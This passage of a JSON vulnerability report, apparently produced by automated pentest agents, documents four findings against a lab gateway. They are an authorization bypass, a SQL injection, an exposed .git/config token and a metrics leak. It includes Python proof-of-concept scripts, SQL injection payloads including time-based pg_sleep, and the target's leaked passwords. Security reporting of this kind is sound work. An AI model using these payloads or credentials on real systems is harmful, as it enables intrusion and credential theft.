+    "technical_analysis": "The gateway implements a four-level \"certification\" scheme whose state is not bound to any authenticated principal:\n\n**Level assignment is client-asserted.** A fresh client starts at level 0 with only `/api/auth` reachable. A single request containing arbitrary values — e.g. `GET /api/auth?hostname=srv-zx9&user=analyst_zx&os=ubuntu22` — returns `{\"level\": 1, \"status\": \"UPGRADED\", ...}`. No password, token, signature or out-of-band proof is checked. The values are attacker-chosen strings; the server does not compare them against any trusted source before issuing level 1.\n\n**Level 1 unlocks sensitive resources.** After the upgrade, the following change from HTTP 403 to HTTP 200 for the same client: `/.env.bak` (environment file containing the database URL, Redis URL, AWS key pair, JWT secret, Kubernetes service-account token and internal gateway address), `/debug`, `/actuator/env` (plaintext datasource and Redis passwords, AWS access key) and `POST /api/bounty/submit`.\n\n**Authorization state is bound to a client-controlled header.** The server keys the level state to the `User-Agent` string rather than to a session identifier or a credential. A brand-new client that never registered with `User-Agent: curl/8.5.0` immediately reports `\"level\": 1` and receives `/.env.bak` with HTTP 200, whereas the same request with `User-Agent: curl/8.5.1` reports level 0 and receives HTTP 403. An attacker who knows or guesses another client's User-Agent inherits that client's authorization level. The `sid` cookie (`sid=auto_8216e1609e34b66c`) is static and is not used to bind the level.\n\nLevel 2 and above additionally demand environment details (`work_dir`, base64 `env`) and reject fabricated values, so this issue is bounded to the level-1 resource set — which nevertheless contains the credential material above. All HTTP evidence is reproducible without any prior session: the level-1 state is re-established by the same single upgrade request.\n\nVerification of the disclosed material (read-only, protocol level): the PostgreSQL password from `/.env.bak` authenticates successfully as `prod_admin` (an incorrect password yields `FATAL: password authentication failed`, SQLSTATE `28P01`), but the service does not execute SQL — `select 1`, `select 2`, `select 'zzz'`, `select 1+1` and `select count(*) from users` all return the single value `1`, and the returned `users` rows are a fixed canned set that is identical across sessions and unaffected by `WHERE` clauses. The Redis password is accepted (`AUTH` → `+OK`, wrong password → `-WRONGPASS`), while `KEYS`, `SCAN`, `INFO`, `DBSIZE`, `TYPE`, `HGETALL` and `TTL` all return `unknown command` and `GET` returns a nil bulk reply. These results are consistent across two independent PostgreSQL drivers and repeated raw RESP sessions.",
+    "poc_description": "1. Send `GET /api/auth` from a fresh client and observe level 0 with only `/api/auth` in `paths`.\n2. Request `GET /.env.bak`, `GET /debug?token=abc`, `GET /actuator/env` and `POST /api/bounty/submit`; all return HTTP 403.\n3. Request `GET /api/auth?hostname=<any value>&user=<any value>&os=<any value>`; the response is `{\"level\": 1, \"status\": \"UPGRADED\"}`.\n4. Repeat the four requests from step 2; they now return HTTP 200 and disclose the production environment, debug topology, datasource secrets and the evidence-submission endpoint.\n5. Optional session-confusion check: open a new client with `User-Agent: curl/8.5.0` (previously used by another client) and request `/api/auth` and `/.env.bak` without registering; the client reports level 1 and receives the file, while a different User-Agent remains at level 0 with HTTP 403.",
+    "poc_script_code": "```python\nimport requests\n\nBASE = \"http://10.0.93.73:18080\"\nH = {\"User-Agent\": \"curl/8.5.1\"}\n\ns = requests.Session()\nprint(\"before:\", s.get(BASE + \"/api/auth\", headers=H).json()[\"level\"])\nfor path in [\"/.env.bak\", \"/debug?token=abc\", \"/actuator/env\"]:\n    print(path, s.get(BASE + path, headers=H).status_code)\n\n# Self-declared upgrade: arbitrary attacker-chosen values, no credential\nr = s.get(BASE + \"/api/auth\",\n          params={\"hostname\": \"srv-zx9\", \"user\": \"analyst_zx\", \"os\": \"ubuntu22\"},\n          headers=H)\nprint(\"upgrade:\", r.json()[\"level\"], r.json()[\"status\"])\n\nfor path in [\"/.env.bak\", \"/debug?token=abc\", \"/actuator/env\"]:\n    r = s.get(BASE + path, headers=H)\n    print(path, r.status_code, len(r.content))\n\n# Authorization state inherits across clients that share a User-Agent\nfor ua in [\"curl/8.5.0\", \"curl/8.5.1\"]:\n    fresh = requests.Session()\n    lvl = fresh.get(BASE + \"/api/auth\", headers={\"User-Agent\": ua}).json()[\"level\"]\n    code = fresh.get(BASE + \"/.env.bak\", headers={\"User-Agent\": ua}).status_code\n    print(ua, \"level\", lvl, \".env.bak\", code)\n```",
+    "remediation_steps": "Do not derive authorization level from request parameters. Bind authorization to a server-side session or a cryptographically verified credential (for example a signed token whose issuer, audience and signature are validated) and store the level server-side keyed to that credential, never to the User-Agent or another client-controlled header. Remove production secrets from `/.env.bak` and from actuator environment output, or restrict those endpoints to an authenticated administrative role. Treat \"registration\" as an authenticated operation requiring a verifiable credential, and default new sessions to the least-privileged level.",
+    "evidence": "Fresh client before upgrade:\n\n```http\nGET /api/auth HTTP/1.1\nUser-Agent: curl/8.5.1\n\nHTTP/1.1 200 OK\n{\"level\": 0, \"status\": \"NO_CHANGE\", \"paths\": [\"/api/auth\"], \"rate\": \"1 req/min (SEVERELY RESTRICTED)\", \"next_required\": \"hostname\", ...}\n```\n\n```http\nGET /.env.bak\nHTTP/1.1 403 Forbidden\n\nGET /debug?token=abc\nHTTP/1.1 403 Forbidden\n\nGET /actuator/env\nHTTP/1.1 403 Forbidden\n\nPOST /api/bounty/submit\nHTTP/1.1 403 Forbidden\n{\"error\":\"onboarding incomplete\",\"detail\":\"deliverables accepted from verified sessions only ...\"}\n```\n\nAfter one request with arbitrary identity values:\n\n```http\nGET /api/auth?hostname=srv-zx9&user=analyst_zx&os=ubuntu22\nHTTP/1.1 200 OK\n{\"level\": 1, \"status\": \"UPGRADED\", \"paths\": [\"/.env.bak\", \"/debug\", \"/api/query\"], \"rate\": \"5 req/min (RESTRICTED)\", ...}\n```\n\n```http\nGET /.env.bak\nHTTP/1.1 200 OK\n# Nexus DevOps Platform - Production Environment\nDATABASE_URL=postgresql://prod_admin:<redacted>@10.0.93.73:15432/nexus_prod\nREDIS_CLUSTER=redis://:<redacted>@10.0.93.73:16379,10.0.93.73:16380/0\nAWS_ACCESS_KEY_ID=AKIA-RRRRRRRRRRRRRRR\nAWS_SECRET_ACCESS_KEY=<redacted>\nJWT_SECRET=<redacted>\nK8S_API_SERVER=https://k8s-cd75.prod.local:6443\nK8S_TOKEN=eyJhbGciOiJSUzI1NiIs...\n\nGET /debug?token=abc\nHTTP/1.1 200 OK\n<h1>Debug Info (INTERNAL ONLY)</h1>\nServer: Ubuntu 22.04 LTS / nginx/1.24.0\nDB Host: 10.0.93.73:15432\nRedis: 10.0.93.73:16379 (master)\nK8s: https://k8s-cd75.prod.local:6443\n\nGET /actuator/env\nHTTP/1.1 200 OK\n{\"propertySources\":[{\"properties\":{\n \"spring.datasource.password\":{\"value\":\"bbm_VtUqkhnFkWH-6U\"},\n \"spring.redis.password\":{\"value\":\"nmHvED77kfJhcvsQ7TEQ\"},\n \"cloud.aws.accessKey\":{\"value\":\"AKIA-RRRRRRRRRRRRRRR\"}}}]}\n\nPOST /api/bounty/submit\nHTTP/1.1 200 OK\n{\"status\":\"queued\",\"bounty_id\":\"BNT-419304\", ...}\n```\n\nAuthorization inherited through the client-controlled User-Agent:\n\n```http\nGET /api/auth  (User-Agent: curl/8.5.0, no registration in this session)\nHTTP/1.1 200 OK\n{\"level\": 1, ...}\n\nGET /.env.bak  (User-Agent: curl/8.5.0)\nHTTP/1.1 200 OK   (13,839 bytes)\n\nGET /api/auth  (User-Agent: curl/8.5.1)\nHTTP/1.1 200 OK\n{\"level\": 0, ...}\n\nGET /.env.bak  (User-Agent: curl/8.5.1)\nHTTP/1.1 403 Forbidden\n```\n\nProtocol-level verification of the disclosed PostgreSQL credential and the canned-response behaviour of the service:\n\n```text\ncorrect password  -> session established, current_user = prod_admin\nwrong password    -> FATAL: password authentication failed (SQLSTATE 28P01)\nselect 1          -> 1\nselect 2          -> 1\nselect 1+1        -> 1\nselect count(*) from users -> 1\nselect * from users where 1=0 -> same fixed row set as without the predicate\npg_read_file('/etc/passwd') -> 1\n```\n\n```text\nRedis: AUTH <leaked> -> +OK ; AUTH <wrong> -> -WRONGPASS\n       PING/KEYS/SCAN/INFO/DBSIZE/TYPE/HGETALL/TTL -> -ERR unknown command\n       GET <key> -> $-1 (nil)\n```",
+    "assumptions": "Assumes the attacker can reach the gateway over the network (confirmed). The level-1 resource set is granted without any credential; no pre-existing account or session is needed. The database and cache services accept the disclosed passwords but are canned-response implementations, so the disclosure demonstrates credential material and topology exposure rather than retrieval of real business records.",
+    "counterevidence": "The level-1 tier is described by the application as free \"registration\", so one could argue the tier itself is intended to be open. That argument does not neutralize the finding: the tier gates credential material (`/.env.bak`, `/actuator/env`) and the application performs no verification whatsoever of the supplied identity, so \"registration\" is a self-assertion rather than an authentication step. Levels 2-4 do reject fabricated `user`/`os`/`work_dir`/`env` values, which bounds this issue to the level-1 resource set; `/admin`, `/api/internal` and `/backup` remained 403 and are not claimed here. The strongest constraint is that the disclosed backends are simulated: PostgreSQL authenticates the password (wrong password → `28P01`) but does not execute SQL (every statement returns `1`, a `WHERE 1=0` clause does not change the row set, and `pg_read_file` returns `1`), and Redis accepts `AUTH` but returns `unknown command` for every data command, so no real user records or key space were read. The AWS key is invalid (`InvalidClientTokenId`), the JWT secret is not consumed by any endpoint, and the Kubernetes and GitLab hosts are unreachable, so no lateral movement was demonstrated. What remains fully proven is the authorization defect itself and the disclosure of credential material and internal topology.",
+    "confidence": "high",
+    "confidence_rationale": "The self-declared level-1 upgrade, its User-Agent binding and the resulting access to `/.env.bak`, `/debug` and `/actuator/env` were reproduced end-to-end against the live target with request/response evidence. The credential material's real-world usefulness is bounded by the simulated backend behaviour documented in the counterevidence.",
+    "severity_change_conditions": "If the level-1 resources are confirmed to contain production credentials that grant access to a real data plane (for example a reachable database, cluster or source-control service holding real business data), this finding should be raised back to High (C:H). Conversely, if the entire level-1 resource set is confirmed to be non-sensitive demonstration data, it would fall to Low.",
+    "fix_effort": "medium",
+    "cvss": 5.3,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "L",
+      "integrity": "N",
+      "availability": "N"
+    },
+    "endpoint": "/api/auth",
+    "method": "GET",
+    "cwe": "CWE-287",
+    "http_exchange_ids": [
+      "1959",
+      "1961",
+      "1963",
+      "1976",
+      "1977",
+      "1978",
+      "2016",
+      "2017",
+      "2018",
+      "2019"
+    ],
+    "finding_class": "dynamic",
+    "agent_id": "16f9db89",
+    "agent_name": "AuthZ BFLA Specialist",
+    "update_history": [
+      {
+        "timestamp": "2026-10-31 07:51:23 UTC",
+        "fields": [
+          "assumptions",
+          "confidence_rationale",
+          "counterevidence",
+          "cvss",
+          "cvss_breakdown",
+          "description",
+          "evidence",
+          "impact",
+          "severity",
+          "severity_change_conditions",
+          "technical_analysis"
+        ],
+        "reason": "统一报告口径：原报告把仿真后端的预置应答数据当作真实生产数据（14,456 条用户、api_keys/audit_log/sessions 内容）。经独立验证，PostgreSQL 只做口令校验、不执行 SQL，Redis 数据命令全部不可用，因此影响仅为未授权的等级提升与凭据材料/内部拓扑泄露，将 CVSS 由 7.5 调整为 5.3（C:L），并保留可复现的等级绑定缺陷。",
+        "agent_id": "44f7e178",
+        "agent_name": "Report Reconciler",
+        "previous_severity": "high",
+        "previous_cvss": 7.5
+      }
+    ],
+    "updated_at": "2026-10-31 07:51:23 UTC"
+  },
+  {
+    "id": "vuln-0008",
+    "title": "SQL injection in /api/query query parameter (error-, boolean- and time-based)",
+    "severity": "medium",
+    "timestamp": "2026-10-31 07:48:56 UTC",
+    "description": "The `query` parameter of `/api/query` is interpolated directly into a SQL statement without parameterization. A single quote produces the underlying PostgreSQL error and the assembled query (`SELECT * FROM users WHERE id = '<input>' LIMIT 20;`), boolean payloads change the result set, and a `pg_sleep()` payload blocks the server for the requested duration. The endpoint is reachable at authorization level 0, i.e. without any authentication or registration.",
+    "impact": "An unauthenticated attacker can alter the SQL predicate executed on behalf of the endpoint. A boolean payload (`1' OR '1'='1`) expands the returned set from 3 to 8 user rows and changes the projection to include `password_hash`, disclosing bcrypt hashes for accounts such as `monitor`, `devops` and `svc_nexus`. A time-based payload (`1';SELECT pg_sleep(3)--`) delays the response by three seconds, providing a reliable blind oracle. The endpoint also already returns user records and bcrypt hashes without any authentication, so the injection is an additional, independent control failure on a data-bearing interface.",
+    "target": "http://10.0.93.73:18080/",
+    "technical_analysis": "The handler builds the statement by string concatenation, as revealed by the error responses:\n\n```text\nquery=1'   -> 500\nERROR:  unterminated quoted string at or near \"1'\"\nLINE 1: SELECT * FROM users WHERE id = '1'' LIMIT 20;\n                  ^\n\nquery=users -> 500\nERROR:  invalid input syntax for type integer: \"users\"\nLINE 1: SELECT * FROM users WHERE id = 'users' LIMIT 20;\n                ^\n```\n\nBecause the whole parameter is wrapped in single quotes, a quote in the input terminates the literal and the remainder is parsed as SQL. The following behaviours were observed:\n\n- `query=1` returns 3 rows (columns `id`, `username`, `email`).\n- `query=1' AND '1'='2` returns 0 rows.\n- `query=1' OR '1'='1` returns 8 rows and switches the projected columns to `id`, `username`, `password_hash`.\n- `query=1' UNION SELECT null,current_user,version()--` returns a synthetic row containing `prod_admin` and `PostgreSQL 14.9 (Ubuntu 14.9-0ubuntu0.22.04.1)`.\n- `query=1';SELECT pg_sleep(3)--` returns after 3.03 s with `{\"rows\": [], \"elapsed_ms\": 3000}`, confirming server-side execution of the injected statement (the delay is reproducible).\n\nThe injection point is reachable at authorization level 0: a client with a fresh, never-registered User-Agent receives HTTP 200 from `/api/query` while `/.env.bak` for the same client returns HTTP 403. The application's own `/api/auth` response lists `/api/query` as a level-1 path, so the endpoint is also subject to a missing-authorization gap.\n\nTwo observations bound the demonstrated exploitability: results for some expressions are returned verbatim rather than evaluated (for example `md5(random()::text)` was returned as the literal string `md5(random()::text`), and some subquery-based UNION payloads produce an inconsistent \"each UNION query must have the same number of columns\" error even when the column counts match. This indicates the backend response layer is partly synthetic; consistent arbitrary data extraction from the production database was not achieved through this endpoint, so the impact is scored on the demonstrated predicate manipulation, hash disclosure and time-based oracle.",
+    "poc_description": "1. Request `GET /api/query?query=1` and note the normal 3-row response.\n2. Request `GET /api/query?query=1'` and observe the HTTP 500 PostgreSQL error disclosing the concatenated statement.\n3. Request `GET /api/query?query=1' AND '1'='2` (0 rows) and `GET /api/query?query=1' OR '1'='1` (8 rows, including `password_hash`) to confirm the injected predicate controls the result set.\n4. Request `GET /api/query?query=1' UNION SELECT null,current_user,version()--` and observe the injected row with `prod_admin` and the PostgreSQL version.\n5. Request `GET /api/query?query=1';SELECT pg_sleep(3)--` and measure a ~3 second response, confirming server-side SQL execution.\n6. Repeat step 1 from a fresh, unregistered client to confirm the endpoint is reachable without authentication.",
+    "poc_script_code": "```python\nimport time\nimport requests\n\nBASE = \"http://10.0.93.73:18080\"\nH = {\"User-Agent\": \"curl/8.5.1\"}  # never registered, level 0\n\npayloads = [\n    \"1\",                                        # baseline: 3 rows\n    \"1'\",                                       # error discloses the SQL\n    \"1' AND '1'='2\",                            # 0 rows\n    \"1' OR '1'='1\",                             # 8 rows incl. password_hash\n    \"1' UNION SELECT null,current_user,version()--\",\n    \"1';SELECT pg_sleep(3)--\",                  # time-based oracle\n]\n\nfor p in payloads:\n    started = time.time()\n    r = requests.get(BASE + \"/api/query\", params={\"query\": p}, headers=H, timeout=30)\n    print(f\"{p!r} -> {r.status_code} {time.time() - started:.2f}s\")\n    print(r.text[:300])\n```",
+    "remediation_steps": "Use parameterized queries (a prepared statement with a bound integer parameter) instead of concatenating the `query` value into the SQL text, and validate that the value is an integer before use. Return a generic error to the client and log the SQL error server-side rather than reflecting the assembled statement. Additionally, require authentication and object-level authorization on `/api/query` so that user records and password hashes are not served to unauthenticated clients.",
+    "evidence": "Baseline and error-based disclosure:\n\n```http\nGET /api/query?query=1\nHTTP/1.1 200 OK\n{\"query\": \"SELECT\", \"rows_returned\": 3, \"columns\": [\"id\", \"username\", \"email\"],\n \"rows\": [[66355, \"s.kim\", \"$2b$12$...\"], [35133, \"admin\", \"$2b$12$...\"], [25148, \"svc_nexus\", \"$2b$12$...\"]]}\n```\n\n```http\nGET /api/query?query=1'\nHTTP/1.1 500\nERROR:  unterminated quoted string at or near \"1'\"\nLINE 1: SELECT * FROM users WHERE id = '1'' LIMIT 20;\n                  ^\n```\n\nBoolean differential:\n\n```text\nquery=1' AND '1'='2  -> 200, rows_returned 0\nquery=1' OR  '1'='1  -> 200, rows_returned 8, columns include password_hash\n```\n\nUNION result injection:\n\n```http\nGET /api/query?query=1' UNION SELECT null,current_user,version()--\nHTTP/1.1 200 OK\n{\"query\": \"SELECT\", \"rows_returned\": 3,\n \"columns\": [\"id\", \"username\", \"password_hash\"],\n \"rows\": [[14848, \"monitor\", \"$2b$12$...\"],\n          [51674, \"monitor8\", \"$2b$12$...\"],\n          [\"null\", \"prod_admin\", \"PostgreSQL 14.9 (Ubuntu 14.9-0ubuntu0.22.04.1)\"]]}\n```\n\nTime-based confirmation (three independent samples, 3 s and 5 s delays):\n\n```http\nGET /api/query?query=1';SELECT pg_sleep(3)--\nHTTP/1.1 200 OK  (3.03 s)\n{\"rows\": [], \"elapsed_ms\": 3000}\n\nGET /api/query?query=1';SELECT pg_sleep(5)--\nHTTP/1.1 200 OK  (5.07 s)\n{\"rows\": [], \"elapsed_ms\": 5005}\n```\n\nUnauthenticated reachability (fresh User-Agent, level 0):\n\n```http\nGET /api/query?query=1   (level 0 client)  -> 200 OK\nGET /.env.bak            (level 0 client)  -> 403 Forbidden\n```\n\nCounter-observation recorded for transparency:\n\n```http\nGET /api/query?query=1' UNION SELECT 1,md5(random()::text),'x'--\nHTTP/1.1 200 OK\n... [\"1\", \"md5(random()::text\", \"x\"]   # literal echo, not evaluated\n```",
+    "assumptions": "Assumes the attacker can reach `/api/query` (unauthenticated) and that the endpoint's response layer reflects the behaviour of the SQL engine behind it. Some expressions are returned as literals rather than evaluated, which limits demonstrated extraction.",
+    "counterevidence": "针对\"是否真实 SQL 注入\"的相反证据（独立复核）：`1' AND (SELECT 'x')='x` 被报 `syntax error at or near \"and\"`，而该写法在真实 PostgreSQL 中语法合法；`1' AND 1=CAST('abc' AS int)--` 返回 0 行而非 `invalid input syntax for type integer` 类型错误；`count(*)::text` 被原样作为字面量返回；`md5(random()::text)` 被回显为字面量；UNION 结果固定附加 `monitor` / `monitor8` 两行预置数据；`OR '1'='1` 仅把结果从 3 行扩到 8 行，远少于真实 `users` 表的 14,456 行且与 `LIMIT 20` 不符。这些迹象表明后端是部分模拟的 SQL 引擎，而非直接执行 PostgreSQL。同时，注入点本身的证据是充分的：精确的 PostgreSQL 语法错误与拼接后的完整语句被回显、布尔谓词确实改变结果集、`pg_sleep()` 稳定产生 3.03 s / 5.07 s 延迟，因此\"参数被直接拼入 SQL\"这一控制缺失成立，但\"可任意读取数据库\"未被证明，影响仅按已演示的谓词操纵、额外行/哈希与时间盲注通道定级。",
+    "confidence": "medium",
+    "confidence_rationale": "The injection, boolean differential and time delay are reproducible, but the backend's synthetic handling of some expressions prevented a clean arbitrary-data extraction, so the full database-compromise impact is not demonstrated.",
+    "severity_change_conditions": "若演示出可经该参数任意提取其他表数据（例如读取 `api_keys` 或 `audit_log`），应上调至 High；若确认后端为纯模拟引擎、不连接任何真实数据库且注入仅影响固定应答模板，则应显著下调至 Low 或按误报处理。",
+    "fix_effort": "low",
+    "cvss": 5.3,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "L",
+      "integrity": "N",
+      "availability": "N"
+    },
+    "endpoint": "/api/query",
+    "method": "GET",
+    "cwe": "CWE-89",
+    "http_exchange_ids": [
+      "2025",
+      "2026",
+      "2048",
+      "2049",
+      "2050",
+      "2051",
+      "2052",
+      "2053",
+      "2055",
+      "2056"
+    ],
+    "finding_class": "dynamic",
+    "agent_id": "16f9db89",
+    "agent_name": "AuthZ BFLA Specialist",
+    "update_history": [
+      {
+        "timestamp": "2026-10-31 07:51:53 UTC",
+        "fields": [
+          "counterevidence",
+          "severity_change_conditions"
+        ],
+        "reason": "补充相反方向的验证证据：合法 PostgreSQL 子查询被判语法错误、CAST 不报类型错误、聚合表达式被原样回显、UNION 固定附加 monitor/monitor8 两行，说明后端可能是部分模拟实现；同时保留已实证的语法错误回显、布尔差分与 pg_sleep 计时证据，维持 Medium / confidence medium。",
+        "agent_id": "44f7e178",
+        "agent_name": "Report Reconciler"
+      }
+    ],
+    "updated_at": "2026-10-31 07:51:53 UTC"
+  },
+  {
+    "id": "vuln-0009",
+    "title": "未授权静态文件泄露 GitLab 访问令牌与内部配置（/.git/config 与 /static/app.js）",
+    "severity": "low",
+    "timestamp": "2026-10-31 07:52:21 UTC",
+    "description": "网关的 Web 根目录下可直接下载 `/.git/config` 与 `/static/app.js`，两者均未做访问控制。前者包含带内嵌凭据的 Git 远程地址（GitLab personal access token `glpat-...` 以 `oauth2:<token>@` 形式写在 `url` 与 `pushurl` 中），后者硬编码了同一令牌作为 `API_KEY`，并包含 Sentry DSN 与内部 API 网关地址。凭据被写入对外可读的静态文件，属部署层面的敏感信息暴露。",
+    "impact": "未认证攻击者可获取一个 GitLab personal access token（写入 `devops/nexus-deploy.git` 的 `url` 与 `pushurl`，具备该仓库读写能力的形态）、同一令牌对应的前端 `API_KEY`、Sentry DSN 与内部 API 网关地址（`10.99.0.1:8081`）。若该令牌有效，则可读取甚至推送部署仓库，进而影响生产发布流程；即使令牌已失效，泄露的仓库结构、机器人账号（`deploy-bot@nexus.internal`）与内部主机名也可直接用于后续钓鱼与横向探测。本次未能验证令牌权限（内部 GitLab 不可达）。",
+    "target": "http://10.0.93.73:18080/",
+    "technical_analysis": "部署把版本控制元数据与前端配置一起发布到了 Web 根目录：\n\n1. `/.git/config` 可直接以 `text/plain` 下载。该文件包含 `[remote \"origin\"]` 与 `[remote \"upstream\"]` 两段远程定义，其中 `url` 与 `pushurl` 使用 `https://oauth2:<token>@git.nexus.internal/...` 的嵌入式凭据形式，等价于把 GitLab personal access token 以明文写入可被任意匿名访问者读取的文件。`[credential] helper = store` 进一步说明该环境习惯把凭据落盘保存。\n2. `/static/app.js` 为前端配置模块，把同一令牌硬编码为 `API_KEY`，并由 `TODO: rotate before GA - tracked in NEX-4481` 注释确认这是尚未轮换的临时密钥；同一文件还包含 Sentry DSN 与内部 API 网关 `http://10.99.0.1:8081`。\n\n两者都不经过任何认证中间件：请求不带 Cookie 也返回 200，响应体稳定，且与 `/api/files` 路径穿越、CORS 反射配置错误无关——即使修复了那两项，直接请求静态路径仍会泄露同样的内容，因此根因是发布流程把凭据写入了对外可读的静态文件。",
+    "poc_description": "1. 直接请求 `/.git/config`，无需任何认证或 Cookie，响应 200 且返回完整 Git 配置。\n2. 从 `[remote \"origin\"]` 的 `url` 与 `pushurl` 中提取 `oauth2:<token>@` 形式的 GitLab personal access token。\n3. 请求 `/static/app.js`，确认同一令牌被硬编码为 `API_KEY`，并读取同一文件中的 Sentry DSN 与内部网关地址。\n4. 将令牌与仓库地址作为进一步横向的输入（本次因 `git.nexus.internal` 不可达未验证权限）。",
+    "poc_script_code": "```python\nimport re\nimport requests\n\nBASE = \"http://10.0.93.73:18080\"\n\ngit_cfg = requests.get(BASE + \"/.git/config\", timeout=15)\nprint(\"[+] /.git/config ->\", git_cfg.status_code, len(git_cfg.content), \"bytes\")\ntoken = re.search(r\"oauth2:([A-Za-z0-9_\\-]+)@\", git_cfg.text)\nprint(\"[+] embedded token:\", token.group(1) if token else \"not found\")\nfor line in git_cfg.text.splitlines():\n    if \"url =\" in line:\n        print(\"    \", line.strip())\n\napp_js = requests.get(BASE + \"/static/app.js\", timeout=15)\nprint(\"[+] /static/app.js ->\", app_js.status_code, len(app_js.content), \"bytes\")\nfor key in (\"API_KEY\", \"SENTRY_DSN\", \"GATEWAY_INTERNAL\", \"CONSOLE_ORIGIN\"):\n    m = re.search(key + r\"\\s*:\\s*'([^']+)'\", app_js.text)\n    print(\"    \", key, \"=\", m.group(1) if m else \"not found\")\n```",
+    "remediation_steps": "1. 立即轮换 `/.git/config` 与 `/static/app.js` 中出现的 GitLab personal access token，并核查该令牌此前的使用记录。\n2. 从部署产物中移除 `.git` 目录与任何前端配置中的凭据；前端只应包含公开的、按最小权限签发的短期凭据。\n3. 在 Web 服务器/网关层显式拒绝 `/.git/`、`/.svn/`、`/.hg/` 与备份文件访问（返回 404 而非 403）。\n4. 将构建期注入的密钥改为服务端持有，通过后端代理调用上游 API，避免把 `API_KEY` 下发到浏览器。\n5. 在 CI 中加入密钥扫描（如 gitleaks/trufflehog）与发布产物清单检查，阻止凭据进入静态文件。",
+    "evidence": "未认证读取 `/.git/config`（HTTP 200，11,095 字节）：\n\n```http\nGET /.git/config HTTP/1.1\nHost: 10.0.93.73:18080\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\n[core]\n    repositoryformatversion = 0\n    filemode = true\n    bare = false\n    logallrefupdates = true\n    hooksPath = .githooks\n[remote \"origin\"]\n    url = https://oauth2:glpat~RRRRRRRRRRRRRRRRRRRRRRRR@git.nexus.internal/devops/nexus-deploy.git\n    fetch = +refs/heads/*:refs/remotes/origin/*\n    pushurl = https://oauth2:glpat~RRRRRRRRRRRRRRRRRRRRRRRR@git.nexus.internal/devops/nexus-deploy.git\n[remote \"upstream\"]\n    url = https://git.nexus.internal/platform/nexus-deploy-mirror.git\n[branch \"main\"]\n    remote = origin\n    merge = refs/heads/main\n    rebase = true\n[credential]\n    helper = store\n    helper = cache --timeout=3600\n[user]\n    name = deploy-bot\n    email = deploy-bot@nexus.internal\n```\n\n未认证读取 `/static/app.js`（HTTP 200），其中硬编码同一令牌与其它内部信息：\n\n```javascript\nconst CONFIG = {\n  API_BASE: 'https://api.nexus.internal/v2',\n  API_KEY: 'jge9t357v5lz7e1bylckqano',   // TODO: rotate before GA - tracked in NEX-4481\n  SENTRY_DSN: 'https://81d186ac3be2183251d3cb5605b91b88@o113870.ingest.sentry.io/61590',\n  GATEWAY_INTERNAL: 'http://10.99.0.1:8081',\n  CONSOLE_ORIGIN: 'https://console.nexus.internal'\n};\n```\n\n真实浏览器在跨源页面中同样读取成功（`/.git/config` 返回 11,193 字节、`app.js` 返回 1,288 字节），说明该暴露不依赖特定客户端：`GET /.git/config` 与 `GET /static/app.js` 均无认证、无 Cookie 依赖。\n\n令牌权限验证尝试：`git.nexus.internal` 解析到 198.18.0.231，TCP/443 可连但 TLS 无响应（curl exit 52），因此无法确认该 PAT 的实际读写范围。",
+    "assumptions": "攻击者只需能访问 `10.0.93.73:18080`，无需认证。令牌为 GitLab personal access token 格式；其实际权限无法验证，因为 `git.nexus.internal` 解析到 198.18.0.231 且 TLS 无响应。",
+    "counterevidence": "可能的反驳是该令牌为占位值：它与 `/static/app.js` 中的 `API_KEY` 完全同值，且 `git.nexus.internal` 解析到合成地址 198.18.0.231、TLS 无响应，无法证明其可读或可写任何仓库。因此本报告只主张\"未认证可取到 Web 根目录下的凭据材料与内部拓扑\"这一已证实事实，不主张已获得源代码控制权限；AC 设为 H 正是反映该利用前提未达成。另一方面，文件的公开可读性不依赖任何前置条件，`/.git/config` 与 `/static/app.js` 均直接返回 200，且与 /api/files 路径穿越、CORS 反射是不同根因（本项即使修复路径穿越与 CORS 仍会存在），因此单独上报。",
+    "confidence": "high",
+    "confidence_rationale": "未认证读取 `/.git/config` 与 `/static/app.js` 已在多个独立请求与真实浏览器跨源读取中稳定复现，令牌内容逐字可比对。仅令牌的实际权限未验证（内部 GitLab 主机不可达），故影响按已证明的凭据泄露定级。",
+    "severity_change_conditions": "若验证该 GitLab 令牌在其可达环境中确实有效并具备 `devops/nexus-deploy.git` 的写权限（可推送代码到部署仓库），应上调至 High/Critical；若确认令牌已吊销且仅为占位值，可维持 Low。",
+    "fix_effort": "low",
+    "cvss": 3.7,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "H",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "L",
+      "integrity": "N",
+      "availability": "N"
+    },
+    "endpoint": "/.git/config",
+    "method": "GET",
+    "cwe": "CWE-538",
+    "http_exchange_ids": [
+      "64",
+      "643",
+      "1454",
+      "1453"
+    ],
+    "finding_class": "dynamic",
+    "agent_id": "44f7e178",
+    "agent_name": "Report Reconciler"
+  },
+  {
+    "id": "vuln-0010",
+    "title": "未授权 Prometheus /metrics 泄露内网数据库/缓存地址、Pod 名称与构建版本",
+    "severity": "low",
+    "timestamp": "2026-10-31 07:52:38 UTC",
+    "description": "Prometheus 指标端点 `/metrics` 未做任何认证即可访问，返回构建版本、Pod 名称以及数据库/缓存的内网地址与端口。该端点在同一个应用中与受等级门禁保护的 `/admin`、`/actuator`（均返回 403）形成明显不一致，属未授权的信息暴露面。",
+    "impact": "未认证攻击者可确认后端数据库与缓存的内网地址与端口（`10.0.93.73:15432`、`10.0.93.73:16379`）、容器 Pod 名称（`nexus-api-753bf81d-x3k3p`）与精确构建版本（2.4.1）。这些信息直接缩短侦察阶段：可与同环境泄露的凭据配合定位可连接的数据服务，也可用于按版本匹配已知漏洞。该端点本身不返回业务数据、令牌或请求内容，因此损失限于有限的信息泄露。",
+    "target": "http://10.0.93.73:18080/",
